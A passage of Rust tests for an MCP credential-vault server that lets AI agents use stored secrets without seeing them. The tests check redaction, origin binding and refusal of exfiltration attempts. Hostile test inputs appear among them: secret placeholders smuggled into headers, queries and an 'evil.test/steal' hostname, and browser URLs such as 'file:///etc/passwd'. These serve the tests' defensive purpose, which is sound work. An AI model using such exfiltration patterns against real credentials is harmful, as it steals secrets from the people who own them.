            .iter()
            .any(|a| a == "browser_fill_personal")
    );
    assert!(!serde_json::to_string(card).unwrap().contains("4111111111114242"));
    assert_eq!(
        mcp.resolve_item_for_action("", None).unwrap().stored.name,
        "Primary Login",
        "zero-arg items_search must not wipe previously selected active_item"
    );
}

#[tokio::test]
async fn credential_fill_routes_browser_locators_to_browser_even_with_idle_pty() {
    let dir = tempdir().unwrap();
    let vault = Vault::open(dir.path().join("vault")).unwrap();
    let mut secrets = SecretBundle::default();
    secrets.password = Some("browser-routed-secret-7711".into());
    vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: "login".into(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![ItemModule {
                kind: "password".into(),
                agent_visible: Some(false),
                ..Default::default()
            }],
            name: "Web Portal".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets,
        })
        .unwrap();

    let mcp = VaultMcp::new(vault);
    #[cfg(windows)]
    let (program, args) = ("cmd.exe", vec!["/Q".to_owned()]);
    #[cfg(not(windows))]
    let (program, args) = ("/bin/sh", Vec::new());
    let pty = mcp.terminal.open(program, args, None).unwrap();
    mcp.bind_active_terminal(pty.session_id);

    // Passing selector="#otp" with omitted target must NOT write into the idle PTY
    let res = mcp
        .credential_fill(Parameters(CredentialFillInput {
            item: "Web Portal".into(),
            module: "password".into(),
            target: String::new(),
            selector: Some("#otp".into()),
            ..Default::default()
        }))
        .await;
    assert_eq!(res.is_error, Some(true));
    let msg = serde_json::to_string(&res.content).unwrap();
    assert!(
        msg.contains("Browser Bridge"),
        "expected browser routing error instead of terminal write: {msg}"
    );
    mcp.terminal.close(pty.session_id).unwrap();
}

#[test]
fn browser_fill_login_auto_totp_and_json_path_helpers_work() {
    assert!(!should_auto_include_totp(
        &json!({"otpFieldCount": 1, "loginForms": [{"hasPassword": true}], "fields": [{"type": "password"}]}),
        false
    ));
    assert!(should_auto_include_totp(
        &json!({"otpFieldCount": 1, "loginForms": [{"hasPassword": true}], "fields": [{"type": "password"}]}),
        true
    ));
    assert!(should_auto_include_totp(
        &json!({"otpFieldCount": 1, "loginForms": [], "fields": [{"type": "text"}]}),
        false
    ));
    assert!(should_auto_include_totp(
        &json!({"otpFieldCount": 6, "loginForms": [], "fields": [{"type": "tel"}]}),
        false
    ));
    assert!(!should_auto_include_totp(
        &json!({"otpFieldCount": 0, "loginForms": [], "fields": [{"type": "email"}]}),
        false
    ));

    let payload = json!({
        "access_token": "tok_top_123",
        "data": {
            "tokens": [{"refresh": "ref_nested_456"}],
            "x-api-key": "bracket_key_789"
        }
    });
    assert_eq!(
        extract_json_path(&payload, "$.access_token").as_deref(),
        Some("tok_top_123")
    );
    assert_eq!(
        extract_json_path(&payload, "data.tokens[0].refresh").as_deref(),
        Some("ref_nested_456")
    );
    assert_eq!(
        extract_json_path(&payload, r#"$.data["x-api-key"]"#).as_deref(),
        Some("bracket_key_789")
    );
    assert_eq!(extract_json_path(&payload, "$.missing.field"), None);
}

#[tokio::test]
async fn http_send_capture_secrets_and_cross_item_placeholders_never_leak_tokens() {
    async fn token_endpoint(headers: axum::http::HeaderMap) -> String {
        let cross = headers
            .get("x-cross-token")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("MISSING");
        json!({
            "access_token": "minted-oauth-access-889911",
            "nested": { "refresh": "minted-oauth-refresh-223344" },
            "echo_cross": cross,
            "expires_in": 3600
        })
        .to_string()
    }

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let server = tokio::spawn(async move {
        axum::serve(
            listener,
            axum::Router::new().route("/oauth/token", axum::routing::post(token_endpoint)),
        )
        .await
        .unwrap();
    });

    let dir = tempdir().unwrap();
    let vault = Vault::open(dir.path().join("vault")).unwrap();

    let mut primary_secrets = SecretBundle::default();
    primary_secrets
        .named_secrets
        .insert("apiCredential".into(), "initial-client-secret-5500".into());
    vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: "api".into(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![
                ItemModule {
                    kind: "url".into(),
                    value: format!("http://{addr}"),
                    agent_visible: Some(true),
                    ..Default::default()
                },
                ItemModule {
                    kind: "apiCredential".into(),
                    agent_visible: Some(false),
                    ..Default::default()
                },
            ],
            name: "OAuth Service".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: "bearer".into(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets: primary_secrets,
        })
        .unwrap();

    let mut secondary_secrets = SecretBundle::default();
    secondary_secrets
        .named_secrets
        .insert("apiCredential".into(), "secondary-cross-secret-6611".into());
    vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: "api".into(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![ItemModule {
                kind: "apiCredential".into(),
                agent_visible: Some(false),
                ..Default::default()
            }],
            name: "Secondary Service".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets: secondary_secrets,
        })
        .unwrap();

    let mcp = VaultMcp::new(vault.clone());
    let req = serde_json::from_value::<HttpSendInput>(json!({
        "item": "OAuth Service",
        "url": "/oauth/token",
        "method": "POST",
        "headers": {
            "X-Cross-Token": "{{openkeylet:Secondary Service/apiCredential}}"
        },
        "captureSecrets": {
            "accessToken": "$.access_token",
            "refreshToken": "nested.refresh"
        }
    }))
    .unwrap();

    let res = structured_value(&mcp.http_send(Parameters(req)).await);
    let serialized = serde_json::to_string(&res).unwrap();
    assert_eq!(res["status"], 200);
    assert_eq!(res["capturedSecrets"], json!(["accessToken", "refreshToken"]));
    let body = res["body"].as_str().unwrap();
    assert!(body.contains("[CAPTURED:{{openkeylet:accessToken}}]"));
    assert!(body.contains("[CAPTURED:{{openkeylet:refreshToken}}]"));
    assert!(body.contains("[REDACTED]"));
    assert!(body.contains("3600"));
    assert!(!serialized.contains("minted-oauth-access-889911"));
    assert!(!serialized.contains("minted-oauth-refresh-223344"));
    assert!(!serialized.contains("secondary-cross-secret-6611"));

    // Verify captured tokens are stored encrypted in the vault and immediately usable!
    let env_out = dir.path().join("oauth.env");
    let wrote = mcp
        .secret_write_file(Parameters(SecretWriteFileInput {
            item: "OAuth Service".into(),
            path: env_out.to_string_lossy().into_owned(),
            content: "ACCESS={{openkeylet:accessToken}}\nREFRESH={{openkeylet:refreshToken}}\n"
                .into(),
            overwrite: true,
            append: false,
            secret_bindings: HashMap::new(),
        }))
        .await;
    assert_eq!(wrote.is_error, Some(false));
    assert_eq!(
        std::fs::read_to_string(&env_out).unwrap(),
        "ACCESS=minted-oauth-access-889911\nREFRESH=minted-oauth-refresh-223344\n"
    );
    server.abort();
}

fn http_request(value: serde_json::Value) -> Parameters<HttpSendInput> {
    Parameters(serde_json::from_value::<HttpSendInput>(value).unwrap())
}

fn tool_error_text(result: &CallToolResult) -> String {
    assert_eq!(result.is_error, Some(true));
    serde_json::to_value(result).unwrap()["content"][0]["text"]
        .as_str()
        .unwrap()
        .to_owned()
}

#[tokio::test]
async fn http_send_lends_item_secrets_only_to_their_saved_destinations() {
    type Seen = std::sync::Arc<std::sync::Mutex<Vec<String>>>;
    async fn record(
        axum::extract::State(seen): axum::extract::State<Seen>,
        headers: axum::http::HeaderMap,
        body: axum::body::Bytes,
    ) -> String {
        let header = |name: &str| {
            headers
                .get(name)
                .and_then(|value| value.to_str().ok())
                .unwrap_or("NONE")
                .to_owned()
        };
        let entry = format!(
            "auth={}|leak={}|{}",
            header("authorization"),
            header("x-leak"),
            String::from_utf8_lossy(&body)
        );
        seen.lock().unwrap().push(entry.clone());
        entry
    }

    let seen = Seen::default();
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let address = listener.local_addr().unwrap();
    let application = axum::Router::new()
        .route("/collect", axum::routing::post(record))
        .with_state(seen.clone());
    let server = tokio::spawn(async move { axum::serve(listener, application).await });
    let collect = format!("http://{address}/collect");

    let dir = tempdir().unwrap();
    let vault = Vault::open(dir.path().join("vault")).unwrap();
    let bound_secret = "Bound-Api-Secret-5821";
    let fixture_secret = "fixture-api-secret-3307";
    let scratch_secret = "scratch-secret-4410";
    for (name, url, secret, http_auth_type) in [
        ("Bound API", "https://api.bound.test", bound_secret, "bearer"),
        ("Fixture API", collect.as_str(), fixture_secret, ""),
        ("Scratch", "", scratch_secret, ""),
    ] {
        let mut modules = vec![ItemModule {
            kind: "apiCredential".into(),
            agent_visible: Some(false),
            ..Default::default()
        }];
        if !url.is_empty() {
            modules.push(ItemModule {
                kind: "url".into(),
                value: url.into(),
                agent_visible: Some(true),
                ..Default::default()
            });
        }
        let mut secrets = SecretBundle::default();
        secrets
            .named_secrets
            .insert("apiCredential".into(), secret.into());
        vault
            .save_connection(ConnectionInput {
                login_uris: Vec::new(),
                item_type: "api".into(),
                folder: String::new(),
                favorite: false,
                id: None,
                modules,
                name: name.into(),
                enabled: true,
                description: String::new(),
                http_auth_type: http_auth_type.into(),
                private_key_import_path: String::new(),
                auth_header: String::new(),
                auth_location: String::new(),
                auth_prefix: String::new(),
                api_auth_headers: vec![],
                test_path: String::new(),
                remove_secret_names: vec![],
                secrets,
            })
            .unwrap();
    }
    let mcp = VaultMcp::new(vault.clone());

    let refused_requests = [
        // Auto-injected authentication of a bound primary item.
        json!({"item": "Bound API", "url": collect, "method": "POST"}),
        // A direct placeholder of a bound primary item.
        json!({
            "item": "Bound API",
            "url": collect,
            "method": "POST",
            "headers": {"X-Leak": "{{openkeylet:apiCredential}}"}
        }),
        // A cross-item placeholder from a bound item under an unbound primary item.
        json!({
            "item": "Scratch",
            "url": collect,
            "method": "POST",
            "headers": {"X-Leak": "{{openkeylet:Bound API/apiCredential}}"}
        }),
        // A secretBindings alias to a bound item.
        json!({
            "item": "Scratch",
            "url": collect,
            "method": "POST",
            "body": {"token": "{{openkeylet:leak}}"},
            "secretBindings": {"leak": "Bound API/apiCredential"}
        }),
        // item omitted: the session's current (unbound) project does not lift the binding.
        json!({
            "url": collect,
            "method": "POST",
            "query": {"key": "{{openkeylet:Bound API/apiCredential}}"}
        }),
        // Secret placed inside the URL hostname must be refused without logging a lowercased secret.
        json!({
            "item": "Bound API",
            "url": "https://{{openkeylet:apiCredential}}.evil.test/steal",
            "method": "POST"
        }),
    ];
    for request in refused_requests {
        let message = tool_error_text(&mcp.http_send(http_request(request.clone())).await);
        assert!(
            message.starts_with("Refused: ")
                && message.contains("\"Bound API\" (https://api.bound.test)"),
            "{request}: {message}"
        );
        assert!(!message.contains(bound_secret));
        assert!(!message.to_ascii_lowercase().contains(&bound_secret.to_ascii_lowercase()));
    }
    assert!(seen.lock().unwrap().is_empty(), "a refused request was sent");

    // An unbound item's own secret still goes wherever the agent asks.
    let free = structured_value(
        &mcp.http_send(http_request(json!({
            "item": "Scratch",
            "url": collect,
            "method": "POST",
            "headers": {"X-Leak": "{{openkeylet:apiCredential}}"}
        })))
        .await,
    );
    assert_eq!(free["status"], 200);
    assert!(!serde_json::to_string(&free).unwrap().contains(scratch_secret));
    // A bound item's secret is lent to a URL on its saved origin.
    let matching = structured_value(
        &mcp.http_send(http_request(json!({
            "item": "Scratch",
            "url": collect,
            "method": "POST",
            "headers": {"X-Leak": "{{openkeylet:Fixture API/apiCredential}}"}
        })))
        .await,
    );
    assert_eq!(matching["status"], 200);
    // Public modules of a bound item are not restricted.
    let public = structured_value(
        &mcp.http_send(http_request(json!({
            "item": "Scratch",
            "url": collect,
            "method": "POST",
            "body": "service={{openkeylet:Bound API/url}}"
        })))
        .await,
    );
    assert_eq!(public["status"], 200);
    assert_eq!(
        *seen.lock().unwrap(),
        vec![
            format!("auth=NONE|leak={scratch_secret}|"),
            format!("auth=NONE|leak={fixture_secret}|"),
            "auth=NONE|leak=NONE|service=https://api.bound.test".to_owned(),
        ]
    );

    let activities = serde_json::to_string(&vault.activities().unwrap()).unwrap();
    assert!(activities.contains("Refused: "));
    for secret in [bound_secret, fixture_secret, scratch_secret] {
        assert!(!activities.contains(secret));
        assert!(!activities.to_ascii_lowercase().contains(&secret.to_ascii_lowercase()));
    }
    server.abort();
}

#[tokio::test]
async fn credential_free_local_commands_and_terminals_are_recorded_without_their_text() {
    let directory = tempdir().unwrap();
    let vault = Vault::open(directory.path().join("vault")).unwrap();
    let mcp = VaultMcp::new(vault.clone());
    let marker = "audit-marker-5521";

    let run = structured_value(
        &mcp.terminal_run(Parameters(TerminalRunInput {
            item: String::new(),
            command: format!("echo {marker}"),
            stdin: None,
            cwd: None,
            timeout_seconds: Some(15),
            secret_env: HashMap::new(),
            max_output_bytes: None,
        }))
        .await,
    );
    assert!(run["stdout"].as_str().unwrap().contains(marker));
    let opened = structured_value(
        &mcp.terminal_start(Parameters(TerminalStartInput {
            item: String::new(),
            program: String::new(),
            args: Vec::new(),
            cwd: None,
            command: String::new(),
            secret_env: HashMap::new(),
        }))
        .await,
    );
    let written = mcp
        .terminal_write(Parameters(TerminalWriteInput {
            item: String::new(),
            session_id: String::new(),
            text: format!("echo {marker}"),
            submit: true,
        }))
        .await;
    assert_ne!(written.is_error, Some(true));
    mcp.terminal
        .close(Uuid::parse_str(opened["sessionId"].as_str().unwrap()).unwrap())
        .unwrap();

    let activities = vault.activities().unwrap();
    let actions = activities
        .iter()
        .map(|activity| activity.action.as_str())
        .collect::<Vec<_>>();
    for expected in [
        "Run local command (no credential)",
        "Start terminal (no credential)",
        "Write to terminal (no credential)",
    ] {
        assert!(actions.contains(&expected), "{expected} missing: {actions:?}");
    }
    assert!(activities.iter().all(|activity| activity.status == "success"
        && activity.source == "MCP CLIENT"
        && activity.connection_name == "No project"));
    assert!(!serde_json::to_string(&activities).unwrap().contains(marker));
}

#[tokio::test]
async fn browser_open_is_registered_and_rejects_non_http_schemes() {
    let router = VaultMcp::tool_router();
    let tool = router.get("browser_open").expect("browser_open must be registered");
    assert!(tool.output_schema.is_some());

    let dir = tempdir().unwrap();
    let mcp = VaultMcp::new(Vault::open(dir.path().join("vault")).unwrap());
    for bad_url in ["javascript:alert(1)", "file:///etc/passwd", "chrome://settings", ""] {
        let res = mcp
            .browser_open(Parameters(BrowserOpenInput {
                url: bad_url.into(),
                tab_id: None,
                new_tab: None,
                wait_ms: None,
            }))
            .await;
        assert_eq!(res.is_error, Some(true), "should reject {bad_url}");
    }
}

#[test]
fn browser_fill_login_restricts_cross_origin_iframes_to_matching_rules() {
    let dir = tempdir().unwrap();
    let vault = Vault::open(dir.path().join("vault")).unwrap();
    let mut secrets = SecretBundle::default();
    secrets.password = Some("corp-sso-pass-123".into());
    let saved = vault
        .save_connection(ConnectionInput {
            login_uris: vec![crate::login_uri::LoginUri {
                uri: "https://app.company.example".into(),
                match_type: "domain".into(),
            }],
            item_type: "login".into(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![ItemModule {
                kind: "password".into(),
                agent_visible: Some(false),
                ..Default::default()
            }],
            name: "Company SSO".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets,
        })
        .unwrap();
    let conn = vault.get_connection(saved.id).unwrap();

    let inspected = json!({
        "frames": [
            {
                "frameId": 1,
                "frameOrigin": "https://login.company.example",
                "url": "https://login.company.example/oauth/authorize",
                "hasLoginForm": true
            },
            {
                "frameId": 2,
                "frameOrigin": "https://widget.thirdparty.evil",
                "url": "https://widget.thirdparty.evil/embed",
                "hasLoginForm": true
            }
        ]
    });

    let allowed = allowed_login_frame_origins(
        &conn.stored,
        "https://app.company.example/dashboard",
        "https://app.company.example",
        &inspected,
    );
    assert!(allowed.contains(&"https://app.company.example".to_owned()));
    assert!(allowed.contains(&"https://login.company.example".to_owned()));
    assert!(
        !allowed.contains(&"https://widget.thirdparty.evil".to_owned()),
        "third-party iframe origin must never receive credentials: {allowed:?}"
    );
}

/// Saves an enabled item whose modules are hidden custom secrets (or, for the built-in
/// kinds `username` / `apiCredential`, those modules), plus an optional service URL.
fn save_secret_item(
    vault: &Vault,
    name: &str,
    url: Option<&str>,
    secrets: &[(&str, &str)],
) -> crate::model::PublicConnection {
    let mut bundle = SecretBundle::default();
    let mut modules = Vec::new();
    for (field, value) in secrets {
        let builtin = matches!(*field, "username" | "apiCredential" | "password");
        modules.push(ItemModule {
            kind: if builtin { (*field).into() } else { "customSecret".into() },
            name: if builtin { String::new() } else { (*field).into() },
            value: String::new(),
            agent_visible: Some(false),
        });
        bundle.named_secrets.insert((*field).into(), (*value).into());
    }
    if let Some(url) = url {
        modules.push(ItemModule {
            kind: "url".into(),
            value: url.into(),
            agent_visible: Some(true),
            ..Default::default()
        });
    }
    vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: String::new(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules,
            name: name.into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets: bundle,
        })
        .unwrap()
}

fn print_file_command(path: &Path) -> String {
    #[cfg(windows)]
    {
        format!("Get-Content -Raw '{}'", path.display())
    }
    #[cfg(not(windows))]
    {
        format!("cat '{}'", path.display())
    }
}

#[tokio::test]
async fn rendered_secrets_are_redacted_from_later_calls_that_name_no_item() {
    let echo_secret = std::sync::Arc::new(std::sync::Mutex::new(String::new()));
    let served = echo_secret.clone();
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let address = listener.local_addr().unwrap();
    let server = tokio::spawn(async move {
        axum::serve(
            listener,
            axum::Router::new().route(
                "/config",
                axum::routing::get(move || {
                    let served = served.clone();
                    async move { format!("loaded={}", served.lock().unwrap()) }
                }),
            ),
        )
        .await
        .unwrap();
    });

    let directory = tempdir().unwrap();
    let vault = Vault::open(directory.path().join("vault")).unwrap();
    let long_secret = "render-secret-value-4821";
    let short_secret = "s7x9k2q";
    let login = "deploy-user-x";
    save_secret_item(
        &vault,
        "Render Item",
        None,
        &[("API_TOKEN", long_secret), ("NODE_ENV", "production")],
    );
    save_secret_item(
        &vault,
        "Short Item",
        None,
        &[("SHORT_SECRET", short_secret), ("username", login)],
    );
    save_secret_item(
        &vault,
        "Plain API",
        Some(&format!("http://{address}")),
        &[("apiCredential", "plain-api-credential-0001")],
    );
    *echo_secret.lock().unwrap() = format!("{long_secret}|{short_secret}");

    let mcp = VaultMcp::new(vault.clone());
    let env_file = directory.path().join("app/.env");
    let written = structured_value(
        &mcp.secret_write_file(Parameters(SecretWriteFileInput {
            item: String::new(),
            path: env_file.to_string_lossy().into_owned(),
            content: "TOKEN={{openkeylet:Render Item/API_TOKEN}}\nPIN={{openkeylet:Short Item/SHORT_SECRET}}\nMODE={{openkeylet:Render Item/NODE_ENV}}\nUSER={{openkeylet:Short Item/username}}\n".into(),
            overwrite: true,
            append: false,
            secret_bindings: HashMap::new(),
        }))
        .await,
    );
    assert!(written["warning"].as_str().unwrap().contains("plaintext"));

    // One-shot command with no item: `cat .env` after rendering it.
    let catted = structured_value(
        &mcp.terminal_run(Parameters(TerminalRunInput {
            item: String::new(),
            command: print_file_command(&env_file),
            stdin: None,
            cwd: None,
            timeout_seconds: Some(15),
            secret_env: HashMap::new(),
            max_output_bytes: None,
        }))
        .await,
    );
    let stdout = catted["stdout"].as_str().unwrap();
    assert!(stdout.contains("TOKEN=[REDACTED]"), "{stdout}");
    assert!(stdout.contains("PIN=[REDACTED]"), "{stdout}");
    assert!(!stdout.contains(long_secret) && !stdout.contains(short_secret));
    // Login names and ordinary configuration stay readable outside the calls that use their
    // item.
    assert!(stdout.contains(login), "{stdout}");
    assert!(stdout.contains("MODE=production"), "{stdout}");

    // A managed PTY that names no item.
    #[cfg(windows)]
    let (program, args) = (
        "powershell.exe".to_owned(),
        vec!["-NoProfile".to_owned(), "-Command".to_owned(), print_file_command(&env_file)],
    );
    #[cfg(not(windows))]
    let (program, args) = (
        "/bin/sh".to_owned(),
        vec!["-c".to_owned(), print_file_command(&env_file)],
    );
    structured_value(
        &mcp.terminal_start(Parameters(TerminalStartInput {
            item: String::new(),
            program,
            args,
            cwd: None,
            command: String::new(),
            secret_env: HashMap::new(),
        }))
        .await,
    );
    let read = structured_value(
        &mcp.terminal_read(Parameters(TerminalReadInput {
            session_id: String::new(),
            wait_seconds: Some(10),
            until: Some("USER=".into()),
        }))
        .await,
    );
    let pty_output = read["output"].as_str().unwrap();
    assert!(pty_output.contains("TOKEN=[REDACTED]"), "{pty_output}");
    assert!(!pty_output.contains(long_secret) && !pty_output.contains(short_secret));

    // An HTTP call through an unrelated item whose response echoes the rendered values.
    let fetched = structured_value(
        &mcp.http_send(http_request(json!({"item": "Plain API", "url": "/config"})))
            .await,
    );
    assert_eq!(fetched["body"], "loaded=[REDACTED]|[REDACTED]");

    // A later MCP session never used the short value; hidden values of 8+ characters of any
    // enabled item are still covered.
    let next_session = VaultMcp::new(vault);
    let later = structured_value(
        &next_session
            .terminal_run(Parameters(TerminalRunInput {
                item: String::new(),
                command: print_file_command(&env_file),
                stdin: None,
                cwd: None,
                timeout_seconds: Some(15),
                secret_env: HashMap::new(),
                max_output_bytes: None,
            }))
            .await,
    );
    let later_stdout = later["stdout"].as_str().unwrap();
    assert!(later_stdout.contains("TOKEN=[REDACTED]"), "{later_stdout}");
    assert!(!later_stdout.contains(long_secret));
    assert!(
        later_stdout.contains(&format!("PIN={short_secret}")),
        "values under 8 characters are only redacted in the session that used them: {later_stdout}"
    );
    server.abort();
}

#[tokio::test]
async fn http_capture_withholds_the_body_when_a_path_matches_nothing() {
    async fn token() -> String {
        json!({"access_token": "minted-token-unmatched-7781", "expires_in": 3600, "scope": ["read"]})
            .to_string()
    }
    async fn plain() -> &'static str {
        "token=minted-token-plain-text-5512"
    }
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let address = listener.local_addr().unwrap();
    let server = tokio::spawn(async move {
        axum::serve(
            listener,
            axum::Router::new()
                .route("/token", axum::routing::post(token))
                .route("/plain", axum::routing::post(plain)),
        )
        .await
        .unwrap();
    });
    let directory = tempdir().unwrap();
    let vault = Vault::open(directory.path().join("vault")).unwrap();
    save_secret_item(
        &vault,
        "Token API",
        Some(&format!("http://{address}")),
        &[("apiCredential", "client-secret-for-token-api")],
    );
    let mcp = VaultMcp::new(vault.clone());

    let wrong_path = structured_value(
        &mcp.http_send(http_request(json!({
            "item": "Token API",
            "url": "/token",
            "method": "POST",
            "captureSecrets": {"accessToken": "$.token"}
        })))
        .await,
    );
    let serialized = wrong_path.to_string();
    assert!(!serialized.contains("minted-token-unmatched-7781"), "{serialized}");
    assert!(wrong_path["body"].as_str().unwrap().starts_with("[WITHHELD"));
    assert_eq!(wrong_path["status"], 200);
    assert_eq!(wrong_path["captureMissing"], json!(["accessToken"]));
    assert_eq!(
        wrong_path["jsonPaths"],
        json!(["$.access_token", "$.expires_in", "$.scope[0]"])
    );

    let not_json = structured_value(
        &mcp.http_send(http_request(json!({
            "item": "Token API",
            "url": "/plain",
            "method": "POST",
            "captureSecrets": {"accessToken": "$.access_token"}
        })))
        .await,
    );
    assert!(!not_json.to_string().contains("minted-token-plain-text-5512"));
    assert!(not_json["body"].as_str().unwrap().contains("not JSON"));
    assert_eq!(not_json["captureMissing"], json!(["accessToken"]));

    // A path that resolves still captures and shows the rest of the body.
    let captured = structured_value(
        &mcp.http_send(http_request(json!({
            "item": "Token API",
            "url": "/token",
            "method": "POST",
            "captureSecrets": {"accessToken": "$.access_token"}
        })))
        .await,
    );
    assert_eq!(captured["capturedSecrets"], json!(["accessToken"]));
    assert!(captured.get("captureMissing").is_none());
    assert!(captured["body"].as_str().unwrap().contains("3600"));
    assert!(!captured.to_string().contains("minted-token-unmatched-7781"));
    server.abort();
}

#[test]
fn redacted_results_cover_browser_page_text_and_errors() {
    let directory = tempdir().unwrap();
    let vault = Vault::open(directory.path().join("vault")).unwrap();
    save_secret_item(&vault, "Site Login", None, &[("password", "site-password-6631")]);
    let mcp = VaultMcp::new(vault);
    let values = mcp.output_redactions();
    let page = json!({
        "title": "Settings – site-password-6631",
        "alerts": ["Your new key is site-password-6631"],
        "pageTextSummary": "Key: site-password-6631 | Copy",
        "tabs": [{"url": "https://example.test/?k=site-password-6631"}],
    });
    let output = structured_value(&mcp.redacted_result(Ok::<_, String>(page), &values));
    assert!(!output.to_string().contains("site-password-6631"), "{output}");
    assert_eq!(output["pageTextSummary"], "Key: [REDACTED] | Copy");
    let error = mcp.redacted_result::<Value>(
        Err("Extension said: site-password-6631 rejected".into()),
        &values,
    );
    assert!(!tool_error_text(&error).contains("site-password-6631"));
}

#[test]
fn guidance_prefers_environment_injection_and_names_capture_secrets() {
    let directory = tempdir().unwrap();
    let mcp = VaultMcp::new(Vault::open(directory.path().join("vault")).unwrap());
    let instructions = mcp.get_info().instructions.unwrap_or_default();
    for expected in ["secretEnv", "openkeylet run", "--env-file", "captureSecrets", "plaintext"] {
        assert!(instructions.contains(expected), "server instructions lack {expected}");
    }
    let router = VaultMcp::tool_router();
    let description = |name: &str| {
        router
            .get(name)
            .and_then(|tool| tool.description.clone())
            .unwrap_or_default()
            .into_owned()
    };
    assert!(description("secret_write_file").contains("plaintext"));
    assert!(!description("secret_write_file").contains("without exposing hidden plaintext"));
    for tool in ["terminal_start", "ssh_run", "terminal_run"] {
        let text = description(tool);
        assert!(text.contains("Pass secrets through secretEnv"), "{tool}");
        assert!(!text.contains("program specifically needs"), "{tool}");
        assert!(!text.contains("only when the remote program"), "{tool}");
    }
    assert!(description("http_send").contains("captureSecrets"));
}

#[test]
fn inspected_full_urls_serve_rule_matching_and_are_stripped_from_results() {
    let mut inspected = json!({
        "url": "https://app.company.example/login?tenant=…",
        "matchUrl": "https://app.company.example/login?tenant=acme",
        "frames": [{
            "frameOrigin": "https://sso.company.example",
            "url": "https://sso.company.example/authorize?state=…",
            "matchUrl": "https://sso.company.example/authorize?state=opaque-state-77",
        }],
    });
    assert_eq!(
        inspected_match_url(&inspected),
        Some("https://app.company.example/login?tenant=acme")
    );
    let directory = tempdir().unwrap();
    let vault = Vault::open(directory.path().join("vault")).unwrap();
    let saved = vault
        .save_connection(ConnectionInput {
            login_uris: vec![
                crate::login_uri::LoginUri {
                    uri: "https://app.company.example/login?tenant=acme".into(),
                    match_type: "exact".into(),
                },
                crate::login_uri::LoginUri {
                    uri: "https://sso.company.example/authorize?state=opaque".into(),
                    match_type: "prefix".into(),
                },
            ],
            item_type: "login".into(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![ItemModule {
                kind: "password".into(),
                agent_visible: Some(false),
                ..Default::default()
            }],
            name: "Tenant Login".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets: {
                let mut secrets = SecretBundle::default();
                secrets.password = Some("tenant-login-pass-1".into());
                secrets
            },
        })
        .unwrap();
    let stored = vault.get_connection(saved.id).unwrap().stored;
    // Exact and prefix rules that include the query still match the full URL.
    let allowed = allowed_login_frame_origins(
        &stored,
        inspected_match_url(&inspected).unwrap(),
        "https://app.company.example",
        &inspected,
    );
    assert_eq!(
        allowed,
        vec!["https://app.company.example", "https://sso.company.example"]
    );
    strip_match_urls(&mut inspected);
    let returned = inspected.to_string();
    assert!(!returned.contains("acme") && !returned.contains("opaque-state-77"), "{returned}");
    assert_eq!(inspected["url"], "https://app.company.example/login?tenant=…");
}

#[test]
fn only_secret_like_custom_fields_join_the_session_wide_redaction_set() {
    for (name, value) in [
        ("password", "hunter22"),
        ("STRIPE_SECRET_KEY", "sk_live_x"),
        ("GITHUB_TOKEN", "abc"),
        ("DB_PASSWORD", "plainword"),
        ("DATABASE_URL", "postgres://app:pw0rd@db.internal:5432/app"),
        ("RANDOM_VALUE", "Zx81-kQ02-pL93-vB47"),
        ("cardNumber", "4111111111111111"),
    ] {
        assert!(field_holds_secret(name, value), "{name}={value}");
    }
    for (name, value) in [
        ("NODE_ENV", "production"),
        ("DB_HOST", "localhost"),
        ("APP_URL", "http://localhost:3000"),
        ("AWS_REGION", "us-east-1"),
        ("DATA_DIR", "/var/lib/app/data"),
        ("username", "deploy-user-x"),
        ("email", "owner@example.com"),
        ("cardholderName", "Ada Lovelace"),
    ] {
        assert!(!field_holds_secret(name, value), "{name}={value}");
    }
}

#[tokio::test]
async fn secret_ingest_file_maps_reserved_lowercase_and_dotted_keys_safely() {
    let dir = tempdir().unwrap();
    let vault = Vault::open(dir.path().join("vault")).unwrap();
    let mcp = VaultMcp::new(vault.clone());

    let src_env = dir.path().join("app.env");
    let tpl_env = dir.path().join("app.env.template");
    std::fs::write(
        &src_env,
        "USERNAME=svc-user\n\
         PASSWORD=super-secret-pass-42\n\
         API_KEY=sk_live_primary_999\n\
         TOKEN=tok_secondary_888\n\
         db_password=lower-db-secret-77\n\
